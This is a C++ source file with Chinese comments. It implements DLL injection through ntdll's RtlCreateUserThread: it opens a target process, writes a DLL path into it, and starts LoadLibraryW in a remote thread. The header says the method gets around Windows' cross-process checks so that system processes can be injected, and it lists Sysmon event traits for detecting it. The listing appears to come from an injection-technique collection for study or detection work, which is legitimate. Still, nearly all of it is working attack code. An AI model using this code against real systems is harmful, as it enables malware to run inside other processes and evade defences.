// ════════════════════════════════════════════════════════════════
//  方法 2: RtlCreateUserThread — CreateRemoteThread 的底层实现
//
//  原理：
//    直接调用 ntdll!RtlCreateUserThread，绕过 Win7/Vista 对
//    CreateRemoteThread 的跨进程检测，可注入系统进程。
//    与方法 1 参数传递方式相同。
//
//  检测特征：
//    - 与 CreateRemoteThread 相似，但调用栈不同
//    - Sysmon Event 8: StartAddress=LoadLibraryW
//    - Sysmon Event 10: OpenProcess 同样的权限请求
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <winternl.h>

// ntdll!RtlCreateUserThread 原型（PCLIENT_ID 用 CLIENT_ID* 替代）
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    HANDLE      ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN     CreateSuspended,
    ULONG       ZeroBits,
    SIZE_T      MaximumStackSize,
    SIZE_T      CommittedStackSize,
    PVOID       StartAddress,
    PVOID       Parameter,
    PHANDLE     ThreadHandle,
    CLIENT_ID*  ClientId
);

bool Inject_RtlCreateUserThread(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] RtlCreateUserThread → PID=%lu\n", pid);

    // 获取 RtlCreateUserThread 地址
    auto RtlCreateUserThread = (pRtlCreateUserThread)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserThread");
    if (!RtlCreateUserThread)
    {
        Print(L"  [!] 找不到 RtlCreateUserThread\n");
        return false;
    }

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    // 写入 DLL 路径
    LPVOID remotePath = WriteStringToProcess(hProc, dllPath);
    if (!remotePath)
    {
        Print(L"  [!] VirtualAllocEx 失败: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }
    Print(L"  [+] DLL 路径已写入 @ %p\n", remotePath);

    LPVOID pLoadLib = GetLoadLibraryAddr();
    Print(L"  [+] LoadLibraryW @ %p\n", pLoadLib);

    // 调用 RtlCreateUserThread
    HANDLE hThread = nullptr;
    CLIENT_ID cid{};
    NTSTATUS status = RtlCreateUserThread(
        hProc, nullptr, FALSE, 0, 0, 0,
        pLoadLib, remotePath,
        &hThread, &cid);

    if (status < 0 || !hThread)
    {
        Print(L"  [!] RtlCreateUserThread 失败: 0x%08X\n", status);
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    Print(L"  [+] 远程线程已创建 TID=%p\n", cid.UniqueThread);

    WaitForSingleObject(hThread, 5000);

    VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);

    Print(L"  [✓] 注入完成\n");
    return true;
}
